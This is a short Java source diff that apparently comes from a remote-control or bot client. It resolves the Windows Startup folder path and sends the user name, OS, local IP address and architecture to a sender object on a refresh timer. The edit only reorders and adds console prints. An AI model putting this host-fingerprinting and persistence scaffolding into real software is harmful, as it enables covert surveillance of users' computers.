@@ -19,7 +19,6 @@ public class ConfigureInit {
     public static void main(String[] args) {
         File file = new File(System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
                 "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
-        System.out.println(file.getPath());
     }
 
     public WebHandler getWebHandler() {
@@ -42,14 +41,16 @@ public class ConfigureInit {
     }
 
     private void getConstants(String version) {
-        SystemVariables.SENDER.send("os", System.getProperty("os.name"));
         SystemVariables.SENDER.send("user", System.getProperty("user.name"));
+        SystemVariables.SENDER.send("os", System.getProperty("os.name"));
+        System.out.println("OS\t\t" + System.getProperty("os.name"));
         try {
             SystemVariables.SENDER.send("ip", InetAddress.getLocalHost().getHostAddress());
         } catch (UnknownHostException e) {
             e.printStackTrace();
         }
         SystemVariables.SENDER.send("arch", version);
+        System.out.println("Version\t" + version);
         SystemVariables.SENDER.send("refresh", String.valueOf(SystemVariables.REFRESHTIME / 1000));
     }
 }
